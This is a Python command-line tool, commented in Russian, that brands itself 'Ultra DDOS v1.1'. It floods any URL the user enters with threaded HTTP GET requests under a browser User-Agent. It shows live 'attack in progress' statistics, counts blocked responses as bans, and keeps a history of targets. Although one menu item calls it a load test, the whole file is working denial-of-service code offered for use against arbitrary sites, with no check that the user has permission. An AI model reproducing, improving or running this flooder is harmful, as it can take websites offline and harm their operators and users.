import os
import sys
import time
import random
import json
import threading
import requests
from datetime import datetime

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 100,
    "timeout": 3,
    "max_duration": 0
}

# ================= ЗЕЛЁНЫЙ ГРАДИЕНТ =================
G1 = "\033[38;2;0;60;0m"
G2 = "\033[38;2;0;90;0m"
G3 = "\033[38;2;0;120;0m"
G4 = "\033[38;2;0;160;0m"
G5 = "\033[38;2;0;200;0m"
G6 = "\033[38;2;0;230;0m"
G7 = "\033[38;2;50;255;50m"
GW = "\033[38;2;200;255;200m"

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
E = "\033[0m"

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    with open('stats.json', 'w') as f:
        json.dump(s, f, indent=4)

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            h = json.load(f)
    except:
        h = []
    h.append(entry)
    if len(h) > 100:
        h = h[-100:]
    with open('history.json', 'w') as f:
        json.dump(h, f, indent=4)

# ================= ВСПОМОГАТЕЛЬНЫЕ =================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def safe_int(prompt, default=100, min_val=1, max_val=1000):
    while True:
        u = input(prompt)
        if u == "":
            return default
        try:
            v = int(u)
            if min_val <= v <= max_val:
                return v
        except:
            pass

def bar(p, w=30):
    p = max(0, min(100, p))
    f = int(w * p / 100)
    c = G if p < 30 else Y if p < 70 else R
    return f"[{c + '█' * f + E + '░' * (w - f)}] {p}%"

# ================= БАННЕР (ГРАДИЕНТ) =================
def banner():
    # Используем позиционирование вместо clear(), чтобы не было мигания
    print(f"{G1} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {E}")
    print(f"{G2}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {E}")
    print(f"{G3}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {E}")
    print(f"{G4}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{E}")
    print(f"{G5}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{E}")
    print(f"{G6}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{E}")
    print(f"{G5}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{E}")
    print(f"{G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}")
    print(f"{G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}")
    print(f"{G1}                                               ░       ░                           {E}")
    print(f"{G7}Ultra DDOS v1.1 | Developer: verifactor @newince{E}")

# ================= HTTP-АТАКА =================
class Attack:
    def __init__(self):
        self.running = False
        self.req = 0
        self.ok = 0
        self.err = 0
        self.ban = 0
        self.bytes = 0
        self.start = 0
        self.lock = threading.Lock()

    def http_worker(self, url):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'Accept': '*/*'
            }
            r = requests.get(url, headers=headers, timeout=CONFIG["timeout"])
            with self.lock:
                self.req += 1
                self.bytes += len(r.content)
                if r.status_code in [200, 301, 302, 404]:
                    self.ok += 1
                elif r.status_code in [403, 429, 503]:
                    self.ban += 1
                    self.err += 1
                else:
                    self.err += 1
        except:
            with self.lock:
                self.req += 1
                self.err += 1

    def start_http(self, url, threads):
        self.running = True
        self.req = self.ok = self.err = self.ban = self.bytes = 0
        self.start = time.time()
        
        def worker():
            while self.running:
                self.http_worker(url)
                time.sleep(random.uniform(0.001, 0.01))
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads_list.append(t)
        
        if CONFIG["max_duration"] > 0:
            time.sleep(CONFIG["max_duration"])
            self.running = False
        
        for t in threads_list:
            t.join(timeout=0.1)

    def stop(self):
        self.running = False

# ================= ВИЗУАЛ (БЕЗ МИГАНИЯ) =================
def attack_view(url, threads, a, atype="HTTP"):
    # Вместо clear() используем \033[H — перемещаем курсор в начало
    sys.stdout.write("\033[H")
    
    elapsed = int(time.time() - a.start)
    rate = int(a.req / elapsed) if elapsed > 0 else 0
    load = min(100, int((rate / (threads * 5)) * 100)) if threads > 0 else 0
    stats = load_stats()
    
    print(f"""
{C}{atype} АТАКА В ПРОЦЕССЕ

{C}Цель      : {W}{url[:30]}
{C}Потоки    : {W}{threads}
{C}Запросы   : {W}{a.req:,}
{C}Скорость  : {W}{rate:,} r/s
{C}Успешно   : {G}{a.ok:,}{E}
{C}Ошибки    : {R}{a.err:,}{E}
{C}Бан       : {R}{a.ban}{E}
{C}Нагрузка  : {W}{bar(load)}
{C}Время     : {W}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
{C}Данные    : {W}{a.bytes/1024/1024:.1f} MB
{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{C}Всего атак за сессию : {W}{stats['attacks']}
{C}Всего запросов       : {W}{stats['requests']:,}
{C}Всего успешно        : {G}{stats['success']:,}{E}
{C}Всего ошибок         : {R}{stats['errors']:,}{E}
{C}[Press ENTER to stop]
{E}
""")

# ================= ТЕСТ =================
def run_test():
    # Очищаем экран только один раз перед началом атаки
    clear()
    banner()
    print(f"{C}HTTP НАГРУЗКА{E}")
    url = input(f"{C}Цель: {W}")
    if not url.startswith('http'):
        url = 'http://' + url
    threads = safe_int(f"{C}Потоки (1-{CONFIG['max_threads']}): {W}", 50, 1, CONFIG['max_threads'])
    
    a = Attack()
    t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
    t.start()
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
    threading.Thread(target=wait, daemon=True).start()
    
    # Сохраняем баннер в буфер, чтобы не перерисовывать каждый раз
    banner_text = []
    # Печатаем баннер один раз
    banner()
    
    try:
        while a.running and not stop[0]:
            attack_view(url, threads, a, "HTTP")
            time.sleep(0.2)  # Частота обновления
    except KeyboardInterrupt:
        pass
    
    a.stop()
    t.join(timeout=0.5)
    
    elapsed = int(time.time() - a.start)
    entry = {
        "target": url, "threads": threads, "duration": elapsed,
        "requests": a.req, "success": a.ok, "errors": a.err,
        "banned": a.ban, "bytes_sent": a.bytes,
        "avg_rate": int(a.req / elapsed) if elapsed > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }
    save_history(entry)
    s = load_stats()
    s["attacks"] += 1
    s["requests"] += a.req
    s["success"] += a.ok
    s["errors"] += a.err
    save_stats(s)
    
    clear()
    banner()
    print(f"""
{C}АТАКА ЗАВЕРШЕНА

{C}Запросы: {W}{a.req:,}
{C}Успешно: {G}{a.ok:,}{E}
{C}Ошибки : {R}{a.err:,}{E}
{C}Бан    : {R}{a.ban}{E}
{C}Время  : {W}{elapsed} сек
{C}Скорость: {W}{int(a.req/elapsed) if elapsed>0 else 0} r/s
{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{C}Всего атак за сессию: {W}{load_stats()['attacks']}
{E}
""")
    input(f"{C}Нажми ENTER для возврата...{E}")

# ================= МЕНЮ =================
def menu():
    clear()
    banner()
    print(f"""
{C}ГЛАВНОЕ МЕНЮ

{C}1.{W} HTTP Load Test
{C}99.{W} Exit
{E}
""")

# ================= MAIN =================
def main():
    while True:
        menu()
        ch = input(f"{C}Выбери: {W}")
        if ch == '1':
            run_test()
        elif ch == '99':
            clear()
            print(f"{C}Выход...{E}")
            sys.exit()
        else:
            print(f"{R}Неверный выбор!{E}")
            time.sleep(1)

if __name__ == "__main__":
    main()
